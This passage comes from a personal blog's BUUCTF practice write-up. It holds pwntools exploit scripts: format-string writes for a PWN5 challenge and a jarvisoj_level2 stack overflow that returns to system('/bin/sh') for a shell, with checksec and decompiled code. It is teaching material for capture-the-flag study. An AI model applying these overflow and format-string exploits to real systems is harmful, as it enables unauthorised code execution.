<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(“node4.buuoj.cn”, 28198)</span><br><span class="line">payload = p32(0x804c044) + p32(0x804c045) + p32(0x804c046) + p32(0x804c047) +b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span><br><span class="line">p.sendafter(“name:”,payload)</span><br><span class="line">p.sendafter(“passwd”,str(0x10101010)) #</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>exp3:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">p = remote(“node4.buuoj.cn”, 28198) </span><br><span class="line">dword_804c044=0x0804C044</span><br><span class="line">payload=fmtstr_payload(10,&#123;dword_804c044:4&#125;) </span><br><span class="line">p.sendlineafter(&quot;your name:&quot;,payload)</span><br><span class="line">p.sendlineafter(&quot;your passwd&quot;,str(4))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(&quot;echo &#x27;Hello World!&#x27;&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[136]; // [esp+0h] [ebp-88h] BYREF</span><br><span class="line"></span><br><span class="line">  system(&quot;echo Input:&quot;);</span><br><span class="line">  return read(0, buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io=process(&#x27;./level2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./level2&#x27;)</span><br><span class="line">binsh=0x0804a024</span><br><span class="line">offset=0x88</span><br><span class="line">system=elf.sym[&#x27;system&#x27;]</span><br><span class="line">payload=b&#x27;a&#x27;*offset+b&#x27;aaaa&#x27;+p32(system)+p32(0)+p32(binsh)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf-wiki"><span class="toc-number">1.</span> <span class="toc-text">ctf-wiki</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.1.</span> <span class="toc-text">一点东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACrop"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text-32%E4%BD%8D"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ret2text(32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode-32"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">ret2shellcode(32)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%88ropchain%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">解法一（ropchain）：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-%EF%BC%9A"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">解法二(系统调用)：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84-linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E8%A1%A8"><span class="toc-number">1.2.1.3.2.1.</span> <span class="toc-text">附 linux 系统调用号表</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.1.3.2.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">1.2.1.3.2.3.</span> <span class="toc-text">细节</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc1"><span class="toc-number">1.2.1.4.1.</span> <span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc2"><span class="toc-number">1.2.1.4.2.</span> <span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc3"><span class="toc-number">1.2.1.4.3.</span> <span class="toc-text">ret2libc3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7rop"><span class="toc-number">1.2.2.</span> <span class="toc-text">中级rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%86%E8%8A%82-1"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">细节</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E7%94%A8payload"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text">通用payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#easy-csu"><span class="toc-number">1.2.2.1.4.</span> <span class="toc-text">easy_csu</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2csu-1"><span class="toc-number">1.2.2.1.5.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2reg"><span class="toc-number">1.2.2.1.6.</span> <span class="toc-text">ret2reg</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#brop"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">brop</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7rop"><span class="toc-number">1.2.3.</span> <span class="toc-text">高级rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.3.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8Dno-relro"><span class="toc-number">1.2.3.1.2.</span> <span class="toc-text">32位no relro</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8DPartial-RELRO"><span class="toc-number">1.2.3.1.3.</span> <span class="toc-text">32位Partial RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.3.1.3.1.</span> <span class="toc-text">手工伪造</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.3.1.3.2.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#64-no-relro"><span class="toc-number">1.2.3.1.4.</span> <span class="toc-text">64_no_relro</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#srop"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">srop</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">1.3.</span> <span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-off-by-null"><span class="toc-number">1.3.1.</span> <span class="toc-text">off-by-one (off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Force"><span class="toc-number">1.3.2.</span> <span class="toc-text">House Of Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.3.2.1.1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.3.2.1.2.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.3.2.1.3.</span> <span class="toc-text">利用步骤：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#newstar"><span class="toc-number">2.</span> <span class="toc-text">newstar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">3.1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">3.2.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">3.3.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.4.</span> <span class="toc-text">ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">解法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.4.2.</span> <span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">3.5.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">3.6.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">3.7.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">3.8.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.9.</span> <span class="toc-text"></span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&text=buuctf学习实录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&is_video=false&description=buuctf学习实录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuctf学习实录&body=Check out this article: https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&name=buuctf学习实录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&t=buuctf学习实录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
